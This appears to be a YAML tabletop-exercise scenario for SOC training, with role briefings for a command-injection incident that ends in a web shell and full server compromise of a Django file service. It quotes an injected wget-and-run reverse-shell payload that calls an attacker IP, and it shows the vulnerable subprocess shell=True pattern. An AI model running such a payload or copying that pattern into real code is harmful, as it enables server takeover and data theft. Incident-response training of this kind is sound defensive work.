id: os_command_injection___web_shell_deployment
name: OS Command Injection — Web Shell Deployment
category: Web App
format_version: 2
difficulty: Critical
soc_tier: L1
roles:
- analyst
- incident_manager
- ciso
- executive
industries:
- all
briefings:
  analyst: You are the Tier-1 SOC analyst on shift. Your SIEM has fired an alert. Triage the scope, identify compromised assets, and take initial containment actions. Preserve evidence and escalate to the incident manager when the incident exceeds L1 scope.
  incident_manager: You are the Incident Manager coordinating the response to Command Injection Leads to Web Shell and Full Server Compromise. Drive containment, evidence preservation, escalation, and cross-team communications; keep the war-room bridge aligned and document every major decision.
  ciso: You are the CISO accountable for Command Injection Leads to Web Shell and Full Server Compromise. Weigh business impact, legal and regulatory notification duties, customer commitments, and the risk of disruptive containment.
  executive: You are the executive sponsor for Command Injection Leads to Web Shell and Full Server Compromise. Focus on business continuity, budget and resource approval, customer and partner communications, and the timing of external disclosure.
executive_brief: 'Executive summary of the Command Injection Leads to Web Shell and Full Server Compromise incident. Your organization runs a file management service at files.acmecorp.com (Python/Django on Ubuntu 22.04, Nginx reverse proxy). The service has a ''diagnose connection'' feature at /api/diagnose that runs a ping test to user-supplied hostnames using subprocess.call(''ping -c 3 '' + user_input, shell=True). At 11:30 today, the WAF detected command injection patterns but the request was already processed before the WAF rule triggered. The attacker from IP 177.54.xx.xx injected: ''; wget http://177.54.xx.xx/shell.py -O /var/www/html/static/.x.py; python3 /var/www/html/static/.x.py &'' — deploying a Python reverse shell. The attacker established a reverse shell, escalated to root via sudo misconfiguration (the Django app runs as a user with passwordless sudo on python3), installed a persistent cron-based backdoor, and exfiltrated the application''s PostgreSQL database (customer accounts,
  file metadata, API keys for cloud storage). The attacker accessed the server from 11:31 to 13:45 — over 2 hours before the SOC was alerted by the outbound connection to 177.54.xx.xx. Business impact: customer-facing service availability and data confidentiality are at risk, and customer notification may be required. Immediate decisions: authorize containment that may interrupt service, preserve forensic evidence, and agree the external communication cadence with legal and communications. Regulatory exposure: privacy counsel should assess breach-notification duties for exposed customer records.'
incident:
  title: Command Injection Leads to Web Shell and Full Server Compromise
  opening: Your organization runs a file management service at files.acmecorp.com (Python/Django on Ubuntu 22.04, Nginx reverse proxy). The service has a 'diagnose connection' feature at /api/diagnose that runs a ping test to user-supplied hostnames using subprocess.call('ping -c 3 ' + user_input, shell=True).
  summary: 'Your organization runs a file management service at files.acmecorp.com (Python/Django on Ubuntu 22.04, Nginx reverse proxy). The service has a ''diagnose connection'' feature at /api/diagnose that runs a ping test to user-supplied hostnames using subprocess.call(''ping -c 3 '' + user_input, shell=True). At 11:30 today, the WAF detected command injection patterns but the request was already processed before the WAF rule triggered. The attacker from IP 177.54.xx.xx injected: ''; wget http://177.54.xx.xx/shell.py -O /var/www/html/static/.x.py; python3 /var/www/html/static/.x.py &'' — deploying a Python reverse shell. The attacker established a reverse shell, escalated to root via sudo misconfiguration (the Django app runs as a user with passwordless sudo on python3), installed a persistent cron-based backdoor, and exfiltrated the application''s PostgreSQL database (customer accounts, file metadata, API keys for cloud storage). The attacker accessed the server from 11:31 to 13:45
    — over 2 hours before the SOC was alerted by the outbound connection to 177.54.xx.xx.'
  compromised_assets:
  - files.acmecorp.com (full root access)
  - PostgreSQL database
  - Cloud storage API keys
  - Persistent cron backdoor
  detected_via: 'EDR alert: outbound connection to known malicious IP from web server process'
  kill_chain:
